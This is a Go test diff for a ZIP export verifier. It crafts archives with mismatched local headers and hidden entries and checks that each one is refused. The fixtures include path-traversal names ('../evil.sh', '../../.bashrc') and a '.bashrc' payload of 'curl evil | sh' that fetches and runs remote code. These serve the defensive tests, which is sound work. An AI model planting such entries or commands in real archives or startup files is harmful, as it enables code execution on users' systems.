@@ -100,6 +100,7 @@ func TestVerifyZIPSafety(t *testing.T) {
 			}
 		})
 	}
+	checkLocalHeaderCases(t, f)
 	// NFC and NFD of the same name count as duplicates of each other.
 	if fold(nfc) != fold(nfd) {
 		t.Fatal("NFC and NFD fold differently")
@@ -206,5 +207,141 @@ func TestZIPDirectoryOffsetMatchesArchiveZip(t *testing.T) {
 	}
 	if binary.LittleEndian.Uint32(zb[off:]) != 0x02014b50 || len(zr.File) != 70_000 {
 		t.Fatalf("zip64: offset %d, %d files", off, len(zr.File))
+	}
+	// The local-header walk accepts archive/zip's zip64 layout too.
+	if err := prescanZIP(bytes.NewReader(zb), int64(len(zb))); err != nil {
+		t.Fatalf("prescan of a zip64 ZIP: %v", err)
+	}
+}
+
+// localHeader returns the offset of the local header named name.
+func localHeader(t testing.TB, data []byte, name string) int {
+	t.Helper()
+	for i := 0; ; {
+		j := bytes.Index(data[i:], []byte("PK\x03\x04"))
+		if j < 0 {
+			t.Fatalf("no local header %s", name)
+		}
+		at := i + j
+		n := int(binary.LittleEndian.Uint16(data[at+26:]))
+		if at+30+n <= len(data) && string(data[at+30:at+30+n]) == name {
+			return at
+		}
+		i = at + 4
+	}
+}
+
+// localHeaderZIPs are ZIPs whose local entries differ from their central
+// directory, which archive/zip alone never sees (review A1 of #507): each
+// value has the detail verify must give.
+func localHeaderZIPs(t testing.TB) map[string]struct {
+	data   []byte
+	detail string
+} {
+	t.Helper()
+	f := newFixture(t)
+	p := filepath.Join(t.TempDir(), "export.zip")
+	f.write(t, p)
+	clean, err := os.ReadFile(p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	out := map[string]struct {
+		data   []byte
+		detail string
+	}{}
+	patch := func(name, detail string, edit func(b []byte, at int)) {
+		b := bytes.Clone(clean)
+		edit(b, localHeader(t, b, ReadmeFile))
+		out[name] = struct {
+			data   []byte
+			detail string
+		}{b, detail}
+	}
+	// (a) The reviewer's probe: the local header names ../evil.sh (same
+	// length), the central directory README.txt.
+	patch("renamed local header", "the local header has another name than the central directory", func(b []byte, at int) {
+		copy(b[at+30:], "../evil.sh")
+	})
+	patch("local method", "other flags or another method", func(b []byte, at int) {
+		binary.LittleEndian.PutUint16(b[at+8:], zip.Store)
+	})
+	patch("local signature", "no local header at its offset", func(b []byte, at int) {
+		b[at+3] = 0x05
+	})
+	patch("data descriptor", "its data descriptor differs from the central directory", func(b []byte, at int) {
+		d := at + bytes.Index(b[at:], []byte("PK\x07\x08"))
+		b[d+4] ^= 0xff // the CRC-32
+	})
+
+	// (b) The reviewer's probe: a local entry ../../.bashrc first, its
+	// central record removed and the end record adjusted.
+	entries := readZIP(t, p)
+	hidden := writeZIP(t, append([]zipEntryT{{name: "../../.bashrc", data: []byte("curl evil | sh\n")}}, entries...))
+	data, err := os.ReadFile(hidden)
+	if err != nil {
+		t.Fatal(err)
+	}
+	end := bytes.LastIndex(data, []byte("PK\x05\x06"))
+	dirSize := int(binary.LittleEndian.Uint32(data[end+12:]))
+	dirOff := int(binary.LittleEndian.Uint32(data[end+16:]))
+	first := data[dirOff:]
+	recLen := 46 + int(binary.LittleEndian.Uint16(first[28:])) + int(binary.LittleEndian.Uint16(first[30:])) + int(binary.LittleEndian.Uint16(first[32:]))
+	var b []byte
+	b = append(b, data[:dirOff]...)
+	b = append(b, data[dirOff+recLen:end]...)
+	eocd := bytes.Clone(data[end:])
+	n := binary.LittleEndian.Uint16(eocd[10:]) - 1
+	binary.LittleEndian.PutUint16(eocd[8:], n)
+	binary.LittleEndian.PutUint16(eocd[10:], n)
+	binary.LittleEndian.PutUint32(eocd[12:], uint32(dirSize-recLen)) //nolint:gosec // a small test ZIP
+	b = append(b, eocd...)
+	out["hidden local entry"] = struct {
+		data   []byte
+		detail string
+	}{b, "is not where the previous entry ends"}
+
+	// A local entry after the last one, before the central directory.
+	var w bytes.Buffer
+	zw := zip.NewWriter(&w)
+	for _, e := range entries {
+		h := &zip.FileHeader{Name: e.name, Method: zip.Deflate}
+		h.SetMode(0o600)
+		ew, _ := zw.CreateHeader(h)
+		_, _ = ew.Write(e.data)
+	}
+	_ = zw.Flush()
+	_ = zw.Close()
+	tail := w.Bytes()
+	end = bytes.LastIndex(tail, []byte("PK\x05\x06"))
+	dirOff = int(binary.LittleEndian.Uint32(tail[end+16:]))
+	junk := []byte("PK\x03\x04trailing local entry")
+	var t2 []byte
+	t2 = append(t2, tail[:dirOff]...)
+	t2 = append(t2, junk...)
+	t2 = append(t2, tail[dirOff:]...)
+	end = bytes.LastIndex(t2, []byte("PK\x05\x06"))
+	binary.LittleEndian.PutUint32(t2[end+16:], uint32(dirOff+len(junk))) //nolint:gosec // a small test ZIP
+	out["trailing local entry"] = struct {
+		data   []byte
+		detail string
+	}{t2, "data between the last entry and the central directory"}
+	return out
+}
+
+// checkLocalHeaderCases runs the localHeaderZIPs cases as sub-tests of
+// TestVerifyZIPSafety: each is refused as a whole with its detail.
+func checkLocalHeaderCases(t *testing.T, f *fixture) {
+	for name, c := range localHeaderZIPs(t) {
+		t.Run("local/"+name, func(t *testing.T) {
+			p := filepath.Join(t.TempDir(), "x.zip")
+			if err := os.WriteFile(p, c.data, 0o600); err != nil {
+				t.Fatal(err)
+			}
+			fs, _ := verify(t, p, VerifyOptions{Trusted: f.trusted()})
+			if len(fs) != 1 || !hasFinding(fs, KindName, "not a readable export ZIP") || !hasFinding(fs, KindName, c.detail) {
+				t.Fatalf("want one name finding %q:\n%s", c.detail, strings.Join(kinds(fs), "\n"))
+			}
+		})
 	}
 }
